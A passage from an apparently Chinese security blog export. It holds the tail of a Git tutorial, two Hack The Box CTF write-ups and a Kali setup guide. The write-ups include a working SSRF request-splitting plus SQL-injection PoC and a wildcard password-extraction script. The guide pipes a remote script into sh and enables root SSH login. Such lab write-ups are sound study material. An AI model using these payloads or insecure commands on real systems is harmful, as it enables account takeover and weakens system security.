<h3 id="2-修复已提交的-commit"><a href="#2-修复已提交的-commit" class="headerlink" title="2. 修复已提交的 commit"></a>2. 修复已提交的 commit</h3><p>一个 commit 只做一件事，如果你发现你刚刚提交的commit不太合适，此时可以使用git commit –amend 把新的改动加入到刚才的 commit中，而刚刚的commit消失不见，使用 git  log 也看不到。</p>
<h3 id="3-修复历史-commit"><a href="#3-修复历史-commit" class="headerlink" title="3. 修复历史 commit"></a>3. 修复历史 commit</h3><p>如果提交了多个相似的 commit ，需要将其合并为一个，或者提交了多个注释都是 fix bug 的commit，需要明确内容，此时可以使用 git rebase -i HEAD<del>3 命令。这个命令指通过交互模式（即 -i 的作用）的方式来进行调整，最后的 HEAD</del>3 指明我们想要修改最近3次的commit。 当我们执行命令后，会出现下图：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/Github基础教程/image-20210910172344905.png" alt="image-20210910172344905" style="zoom:50%;" />

<p>这里我们可以调整注释，合并两个 commit （使用squash）或者舍弃某个commit（直接去掉某个commit号）。注释介绍了每个命令的作用。即使不修改任何内容，进入这个模式后，也会重写这几个 commit(重新生成commit号)。</p>
<h1 id="0x04-名词解释"><a href="#0x04-名词解释" class="headerlink" title="0x04 名词解释"></a>0x04 名词解释</h1><p><strong>Repository</strong>：简称Repo，可以理解为“仓库”，我们的项目就存放在仓库之中。也就是说，如果我们想要建立项目，就得先建立仓库；有多个项目，就建立多个仓库。</p>
<p><strong>Issues</strong>：可以理解为“问题”，举一个简单的例子，如果我们开源一个项目，如果别人看了我们的项目，并且发现了bug，或者感觉那个地方有待改进，他就可以给我们提出Issue，等我们把Issues解决之后，就可以把这些Issues关闭；反之，我们也可以给他人提出Issue。</p>
<p><strong>Star</strong>：可以理解为“点赞”，当我们感觉某一个项目做的比较好之后，就可以为这个项目点赞，而且我们点赞过的项目，都会保存到我们的Star之中，方便我们随时查看。在 GitHub 之中，如果一个项目的点星数能够超百，那么说明这个项目已经很不错了。</p>
<p><strong>Fork</strong>：可以理解为“拉分支”，如果我们对某一个项目比较感兴趣，并且想在此基础之上开发新的功能，这时我们就可以Fork这个项目，这表示复制一个完成相同的项目到我们的 GitHub 账号之中，而且独立于原项目。之后，我们就可以在自己复制的项目中进行开发了。</p>
<p><strong>Pull Request</strong>：可以理解为“提交请求”，此功能是建立在Fork之上的，如果我们Fork了一个项目，对其进行了修改，而且感觉修改的还不错，我们就可以对原项目的拥有者提出一个Pull请求，等其对我们的请求审核，并且通过审核之后，就可以把我们修改过的内容合并到原项目之中，这时我们就成了该项目的贡献者。</p>
<p><strong>Merge：</strong>可以理解为“合并”，如果别人Fork了我们的项目，对其进行了修改，并且提出了Pull请求，这时我们就可以对这个Pull请求进行审核。如果这个Pull请求的内容满足我们的要求，并且跟我们原有的项目没有冲突的话，就可以将其合并到我们的项目之中。当然，是否进行合并，由我们决定。</p>
<p><strong>Watch：</strong>可以理解为“观察”，如果我们Watch了一个项目，之后，如果这个项目有了任何更新，我们都会在第一时候收到该项目的更新通知。</p>
<p><strong>Gist：</strong>如果我们没有项目可以开源或者只是单纯的想分享一些代码片段的话，我们就可以选择Gist。不过说心里话，如果不翻墙的话，Gist并不好用。</p>
<h1 id="0x05-常见错误"><a href="#0x05-常见错误" class="headerlink" title="0x05 常见错误"></a>0x05 常见错误</h1><h3 id="Updates-were-rejected-because-the-tip-of-your-current-branch-is-behind"><a href="#Updates-were-rejected-because-the-tip-of-your-current-branch-is-behind" class="headerlink" title="Updates were rejected because the tip of your current branch is behind"></a><strong>Updates were rejected because the tip of your current branch is behind</strong></h3><p>出现这个错误的原因是git本地仓库的当前版本低于远程仓库的版本(大白话就是：你在github上进行的修改没有同步到本地git仓库中)。</p>
<ul>
<li>第一种错误的原因</li>
</ul>
<blockquote>
<p>某一天你在本地仓库进行了相关修改然后上传到远程仓库中，这时本地仓库和远程仓库都是同步的，不会出现这种错误。过了几天你突然在github看到了一个错误需要修改，但你并没有通过本地仓库进行修改而是直接在github上进行修改，然后保存修改。这里就要注意一个问题，之前你通过本地仓库进行修改文章最后都会上传到远程仓库(也就是github中)，这就保证了远程仓库和本地仓库是同步的，但是如果你直接在远程仓库(github)中进行修改，默认是不会上传到本地的，这就导致了一个问题，本地仓库中的相关内容没有被修改，而远程仓库中的相关内容被修改，这里可以理解为远程仓库更新了而本地仓库没有更新，这就导致了本地仓库的版本落后于远程仓库，也就是本地仓库和远程仓库版本不一致。而你现在直接在本地仓库这个落后的仓库中修改相关文件然后上传到远程仓库中就会出现错误，本地的修改是基于之前版本的修改，这种修改无法基于远程仓库中这种之后的版本，因为要修改的地方原本的内容都不同就会导致有些修改方法无法实现(比如说本地仓库要把1变为2就加一就可以了，但是远程仓库不是1而是3，这是如果用本地仓库的修改方法也加一就会变为4，这显然是不合适的)。</p>
</blockquote>
<p>第二种原因</p>
<blockquote>
<p>在企业开发中，通常一个项目不是由一个人独立完成的而是由多个人共同完成的，由于另外的程序员更改了相关的代码并向远程上传了更改，而你没有同步他的更改而是在之前的基础上也更改了并上传就会出现版本低于远程版本的错误无法修改。举个简单的例子，要实现一个算式3先加一在减二最终得到2的功能，实现这个功能需要两步：先加一j，然后减二。假设你负责实现加一的功能，另外一个程序员实现减二的功能，现在本地仓库和远程仓库的数字都是3，正常情况下是你先实现加一的功能使本地的数字变为4然后上传到远程使远程的数字变为4，然后另一位程序员将远程更改后的数字4同步到本地使本地的数字也变为4，然后在本地4的基础上实现减二的功能使其变为2然后上传到远程使其也变为2，最后你同步远程的2到本地使你的本地数字也变为2，这样就实现了该功能。但是由于你的个人原因，让另一位程序员提前你一步实现减二的功能并上传到远程，导致远程的数字变为了0，而你现在上传加一的功能肯定是会报错的，如果成功那么远程就变为了1这显然是达不到功能需求的。</p>
</blockquote>
<p>解决方案</p>
<ul>
<li>错误的解决方案(注意是错误的解决方案，但如果这个项目只是你一个人的话，可以执行下面的操作)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在终端下输入：</span><br><span class="line">git push -u origin master -f</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  这句话执行的后果就是在远程仓库中进行的相关修改会被删除，使远程仓库回到你本地仓库未修改之前的那个版本，<br>   然后上传你基于本地仓库的修改。这如果在企业开发中就会让别的程序员的这些天的开发付之东流，一切回到解放前。</p>
</blockquote>
<ul>
<li><p>正确的解决方案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先在终端下输入：git pull origin master</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这句话是说将远程中进行的相关修改保存下来<br>  但这时可能会报错：error: Your local changes to the following files would be overwritten by merge:<br>  解决方案看我另一篇博客：<a href="https://blog.csdn.net/IT_SoftEngineer/article/details/107133284">https://blog.csdn.net/IT_SoftEngineer/article/details/107133284</a><br>  解决上述问题后就可保证远程仓库的更新会被同步到本地而本地仓库的修改也不会被覆盖<br>  然后就是add,commit,push命令将本地的修改上传到远程仓库中</p>
<h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><p>菜鸟教程：<a href="https://www.runoob.com/w3cnote/git-guide.html">https://www.runoob.com/w3cnote/git-guide.html</a></p>
<p>知乎：<a href="https://zhuanlan.zhihu.com/p/369486197">https://zhuanlan.zhihu.com/p/369486197</a></p>
<p>csdn：<a href="https://blog.csdn.net/IT_SoftEngineer/article/details/107133313">https://blog.csdn.net/IT_SoftEngineer/article/details/107133313</a></p>
]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB 之 Weather App</title>
    <url>/posts/8adea4a.html</url>
    <content><![CDATA[<h3 id="HTB之Weather-App"><a href="#HTB之Weather-App" class="headerlink" title="HTB之Weather App"></a>HTB之Weather App</h3><h4 id="0x01-挑战说明"><a href="#0x01-挑战说明" class="headerlink" title="0x01 挑战说明"></a>0x01 挑战说明</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CHALLENGE DESCRIPTION</span><br><span class="line">A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I&#x27;m hallucinating with the memories of my past life, it&#x27;s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I&#x27;ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that&#x27;s operating this website and set me free! 🧙‍♀️</span><br></pre></td></tr></table></figure>

<h4 id="0x02-收集信息"><a href="#0x02-收集信息" class="headerlink" title="0x02 收集信息"></a>0x02 收集信息</h4><p>打开页面，没有找到什么可利用的信息。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/HTB之Weather App/image-20210504205548305.png" alt="image-20210504205548305" style="zoom: 50%;" />

<p>下载所需的文件，里面有此天气程序的源代码和一个docker容器，我们可以在linux上运行此docker容器，然后在127.0.0.1:1337本地访问，以便测试。</p>
<p>![image-20210504210303652](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504210303652.png)</p>
<p>首先要摸清楚该应用程序是如何工作的，才有可能快速找到漏洞所在。</p>
<p>一个个看，首先是<code>helpers/HttpHelpers.js</code>文件:</p>
<p>![image-20210504210947011](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504210947011.png)</p>
<p>此文件有个HttpGet()函数，作用是接收一个url并发起一个请求，然后对返回的数据进行处理。</p>
<p>然后是<code>helpers/WeatherHelpers.js</code>文件:</p>
<p>![image-20210504211255684](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504211255684.png)</p>
<p>此文件定义了一个<code>getWeather</code>函数，该函数调用了<code>HttpGet(url)</code>函数，作用是访问了一个api，并接收处理返回的数据，其中有几个变量，<code>endpoint</code> <code>city</code> <code>country</code>，留意这几个变量，看是否可以注入恶意数据。</p>
<p>查看<code>routes/index.js</code>：</p>
<p>发现代码里面有四条可用路由，我们可以知道这是一个应用了Express的Node.js的应用程序：</p>
<p>![image-20210504212025235](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504212025235.png)</p>
<p>![image-20210504212038498](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504212038498.png)</p>
<p>![image-20210504212051089](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504212051089.png)</p>
<p>![image-20210504212101328](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504212101328.png)</p>
<p>查看一下路由<code>/register</code>的代码：</p>
<p>![image-20210504212928868](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504212928868.png)</p>
<p>发现如果想要注册一个用户必须满足两个条件：</p>
<ol>
<li>必须是post请求提交</li>
<li>post请求必须来自服务器端</li>
</ol>
<p>留意条件二，说明我们利用SSRF来攻破这个应用，我们需要注意哪些地方可以利用SSRF。</p>
<p>查看路由<code>/login</code>的代码：</p>
<p>![image-20210504213001294](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504213001294.png)</p>
<p>我们可以知道以下几个信息：</p>
<ol>
<li>post方式访问</li>
<li>admin用户登录可以访问<code>/app/flag</code>页面，获取flag</li>
</ol>
<p>这时候，我们就会想到注册一个admin用户，然后登录。但是admin用户很可能已经存在，我们需要继续往下看。</p>
<p>查看<code>/js/</code>目录里的两个文件：</p>
<p>![image-20210504214124771](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504214124771.png)</p>
<p>里面定义了一些常量和调用了上面的<code>getWeather()</code>函数，跳过。</p>
<p>查看<code>views/database.js</code>文件：</p>
<p>先看<code>migrate()函数</code></p>
<p>![image-20210504214510053](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504214510053.png)</p>
<p>定义username字段的时候用了UNIQUE，所以用户名不能重复，且在创建该表的时候就已经创建了一个admin用户。密码经过使用了随机的32字节转换成16进制后存放进数据库，所以爆破密码是不现实的。</p>
<p>再看<code>register()</code>函数:</p>
<p>![image-20210504215556804](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504215556804.png)</p>
<p>该函数在使用sql语句的时候，没有使用 “  ？”参数化查询，说明可以我们可以在注册用户的时候实施恶意注入攻击。</p>
<p>再看<code>isAdmin()</code>函数：</p>
<p>![image-20210504215942402](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504215942402.png)</p>
<p>显而易见，该函数的功能是判断登录的时候用户是否<code>admin</code>，在查询过程中使用了参数化查询，也消除了恶意字符，没有利用价值。</p>
<p>由上面可知，该应用程序的工作逻辑是这样的：</p>
<p>main.js——&gt;调用getWeather()——&gt;getWeather()调用Httpget()并传递参数api，用来发出GET请求。</p>
<h4 id="0x03-思路"><a href="#0x03-思路" class="headerlink" title="0x03 思路"></a>0x03 思路</h4><p>我们将采用SSRF攻击该程序，利用点显然在这里。</p>
<p>![image-20210504221823033](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504221823033.png)</p>
<p>如何构造一个有效的payload发起请求是关键。</p>
<p>我们可以尝试通过截断字符来发出额外的http请求，而且Node 8的http模块很容易<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">通过Request Splitting</a>受到<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">SSRF的</a>攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格 编码为 		  		\u0120 </span><br><span class="line">\r  编码为	 	 		 \u010D</span><br><span class="line">\n	编码为				 \u010A</span><br><span class="line">字符 “ 和 ” 必须经过URL编码。</span><br></pre></td></tr></table></figure>

<h4 id="0x04-构造Payload"><a href="#0x04-构造Payload" class="headerlink" title="0x04 构造Payload"></a>0x04 构造Payload</h4><p>初步构造的url效果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line">POST /register HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>该payload还无法产生威胁，根据我上面获取到的信息，<code>register()</code>函数是可以进行SQL注入攻击的，结合SQL攻击。</p>
<p>使username为 <code>admin</code></p>
<p>password为  <code>1234&#39;) ON CONFLICT(username) DO UPDATE SET password = &#39;admin&#39;;--</code></p>
<p>会产生如下效果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;, 1337&#x27;) ON CONFLICT(username) DO UPDATE SET password = &#x27;admin&#x27;;--&#x27;)</span><br></pre></td></tr></table></figure>

<p>如果用户名冲突，密码将更新为admin。</p>
<p>我们可以构造如下url：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line">POST /register HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=1234&#x27;) ON CONFLICT(username) DO UPDATE SET password = &#x27;admin&#x27;;--</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure>

<h4 id="0x05-编写POC"><a href="#0x05-编写POC" class="headerlink" title="0x05 编写POC"></a>0x05 编写POC</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://138.68.182.108:31521&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">password = <span class="string">&quot;111&#x27;) ON CONFLICT(username) DO UPDATE SET password = &#x27;admin&#x27;;--&quot;</span></span><br><span class="line"></span><br><span class="line">parsedUsername = username.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;\u0120&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;%27&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;%22&quot;</span>)</span><br><span class="line">parsedPassword = password.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;\u0120&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;%27&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;%22&quot;</span>)</span><br><span class="line">contentLength = <span class="built_in">len</span>(parsedUsername) + <span class="built_in">len</span>(parsedPassword) + <span class="number">19</span></span><br><span class="line">endpoint = <span class="string">&#x27;127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010A\</span></span><br><span class="line"><span class="string">POST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120\</span></span><br><span class="line"><span class="string">application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120&#x27;</span>+<span class="built_in">str</span>(contentLength)+<span class="string">&#x27;\u010D\</span></span><br><span class="line"><span class="string">\u010A\u010D\u010Ausername=&#x27;</span>+parsedUsername+<span class="string">&#x27;&amp;password=&#x27;</span>+parsedPassword+<span class="string">&#x27;\u010D\u010A\u010D\u010A\</span></span><br><span class="line"><span class="string">GET\u0120&#x27;</span></span><br><span class="line">r = requests.post(url + <span class="string">&#x27;/api/weather&#x27;</span>,json=&#123;<span class="string">&#x27;endpoint&#x27;</span>:endpoint,<span class="string">&#x27;city&#x27;</span>:<span class="string">&#x27;lol&#x27;</span>,<span class="string">&#x27;country&#x27;</span>:<span class="string">&#x27;lol&#x27;</span>&#125;)    </span><br></pre></td></tr></table></figure>

<p>![image-20210504230206777](..&#x2F;imgs&#x2F;HTB之Weather App&#x2F;image-20210504230206777.png)</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB之Phonebook</title>
    <url>/posts/c5487252.html</url>
    <content><![CDATA[<h3 id="HTB之Phonebook"><a href="#HTB之Phonebook" class="headerlink" title="HTB之Phonebook"></a>HTB之Phonebook</h3><h4 id="0x01-提示"><a href="#0x01-提示" class="headerlink" title="0x01 提示"></a>0x01 提示</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Who is lucky enough to be included in the phonebook?</span><br></pre></td></tr></table></figure>

<p>看提示意思是要枚举或者查找电话簿？直接打开页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/HTB%E4%B9%8BPhonebook/image-20210504155530690-1620116985210.png" alt="image-20210504155530690"></p>
<h4 id="0x02-尝试"><a href="#0x02-尝试" class="headerlink" title="0x02 尝试"></a>0x02 尝试</h4><p>查看源代码，发现什么都没有。</p>
<p>爆破是不可能爆破的，只能尝试绕过，先上burpsuite，对输入框进行fuzz，看看有没有sql注入漏洞，没有成功。</p>
<p>然后尝试通配符*绕过，尝试使用用户名：<code>Reese</code> 和密码：<code>*</code>   ，进行登录。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/HTB之Phonebook/image-20210504160031990.png" alt="image-20210504160031990" style="zoom:50%;" />

<p>登录成功，进入到下一个页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/HTB%E4%B9%8BPhonebook/image-20210504160157925.png" alt="image-20210504160157925"></p>
<p>在搜索栏中输入一个空格，搜索，出现下图页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/HTB%E4%B9%8BPhonebook/image-20210504160346778.png" alt="image-20210504160346778"></p>
<p>没有找到有用的信息，查看源代码，也是没有。</p>
<p>回到刚才的页面，将用户名改为Hun，密码还是*，尝试登录，没有成功。</p>
<h4 id="0x03-猜测"><a href="#0x03-猜测" class="headerlink" title="0x03 猜测"></a>0x03 猜测</h4><p>本来以为该页面区分管理员和非管理员，当前登录为非管理员账户，所有没有获取到flag，但是换了用户名，没有登录成功，说明关键点还是在用户Reese上。</p>
<p>本页面有一个漏洞就是通配符，想到是否可以利用通配符来爆破密码？猜测flag就是用户的密码。</p>
<p>尝试输入密码为<code>HTB&#123;*&#125;</code>,发现登录成功，说明flag就是密码。</p>
<h4 id="0x04-获取flag"><a href="#0x04-获取flag" class="headerlink" title="0x04 获取flag"></a>0x04 获取flag</h4><p>当然，一个个尝试不太现实，我们可以编写python脚本来进行破解，脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Created on Tue May  4 14:11:24 2021</span><br><span class="line"></span><br><span class="line">@author: Fstraw</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">pw = &#x27;HTB&#123;&#x27;</span><br><span class="line">url = &#x27;http://xxx/login&#x27;</span><br><span class="line">#HTB的flag由英文大小写和数字和下划线构成。</span><br><span class="line">words = string.ascii_lowercase + string.ascii_uppercase + &#x27;0123456789_&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    #遍历所有字符串</span><br><span class="line">    for w in words:</span><br><span class="line">        #提交的值</span><br><span class="line">        data = &#123;&#x27;username&#x27;:&#x27;reese&#x27;,&#x27;password&#x27;:pw + w + &#x27;*&#x27; &#125;</span><br><span class="line">        r = requests.post(url,data)</span><br><span class="line">        lenth = r.headers[&#x27;Content-Length&#x27;] </span><br><span class="line">        #登录成功的长度为2586</span><br><span class="line">        if lenth == &#x27;2586&#x27;:  </span><br><span class="line">            pw = pw + w</span><br><span class="line">            print(&#x27;==============&#x27;)</span><br><span class="line">            print(pw)</span><br><span class="line">            #跳出for循环</span><br><span class="line">            break</span><br><span class="line">    data = &#123;&#x27;username&#x27;:&#x27;reese&#x27;,&#x27;password&#x27;:pw + &#x27;&#125;&#x27;&#125;</span><br><span class="line">    r = requests.post(url,data)</span><br><span class="line">    if r.headers[&#x27;Content-Length&#x27;] == &#x27;2586&#x27;:   </span><br><span class="line">    	#输出flag</span><br><span class="line">        print(&#x27;==============&#x27;)</span><br><span class="line">        print(pw + &#x27;&#125;&#x27;)</span><br><span class="line">        #跳出while循环</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<h4 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h4><p>考察了对通配符漏洞的利用和编写python脚本的能力。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali优化</title>
    <url>/posts/56c73bb3.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为 Hacker 的常用操作系统，怎么能不把它配置的更 cool😎 呢？</p>
<h2 id="Kali-Linux-优化"><a href="#Kali-Linux-优化" class="headerlink" title="Kali Linux 优化"></a>Kali Linux 优化</h2><ol>
<li>设置root密码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新源为国内源</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>源：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib</span><br><span class="line">#浙大源</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>软件更新和安装（先看第四步）</li>
</ol>
<p>使用下方这两条命令即可，其他的为介绍：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade -y</span><br><span class="line">apt autoremove -y</span><br></pre></td></tr></table></figure>

<p>软件数据库更新：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<p>软件更新：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure>

<p>系统更新：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure>

<p>卸载多余的软件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get autoremove</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>防止更新后终端无法打开</p>
<p>输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>

<p>进入语言的图形化界面后，（空格是选择，Tab是切换，<em>是已经选中状态），选中en_US.UTF-8和zh_CN.UTF-8</em>(这个默认选中)，按enter键，然后将en_US.UTF-8设为默认。</p>
<p>安装中文字体：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br><span class="line">reboot重启</span><br></pre></td></tr></table></figure>

<p>然后就可以开始第三步了。</p>
</li>
<li><p>中文输入法的设置</p>
</li>
</ol>
<p>安装输入法框架</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install fcitx</span><br></pre></td></tr></table></figure>

<p>安装谷歌拼音</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install fcitx-googlepinyin</span><br></pre></td></tr></table></figure>

<p>然后<code>reboot</code>重启</p>
<p><code>ctrl</code>+<code>space</code>切换输入法</p>
<ol start="6">
<li>firefox切换为中文</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找firefox的中文语言包：apt search firefox | grep zh-cn</span><br><span class="line">安装语言包：apt install firefox-esr-l10n-zh-cn -y</span><br><span class="line">安装完后打开firefox，成功</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Kali%E4%BC%98%E5%8C%96/image-20210427154804951.png" alt="image-20210427154804951"></p>
<ol start="7">
<li>安装截图软件flameshot</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install flameshot</span><br><span class="line">flameshot gui 打开</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>垃圾清理</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install bleachbit</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>终端美化</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install zsh</span><br><span class="line">curl -L https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh | sh   	//安装zsh的配置文件</span><br><span class="line">vim ~/.zshrc  		//更改主题</span><br><span class="line">将ZSH_THRME=&quot;xxx&quot;改为&quot;ys&quot;</span><br><span class="line">保存退出，执行：</span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>msf连接数据库</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动postgresql数据库：</span><br><span class="line">service postgresql start</span><br><span class="line">初始化msf_db:</span><br><span class="line">msfdb init</span><br><span class="line">直接运行：</span><br><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<ol start="11">
<li>安装ssh服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install ssh</span><br><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></li>
</ol>
<p>将<code>#PermitRootLogin prohibit-password</code>改为<code>PermitRootLogin yes</code></p>
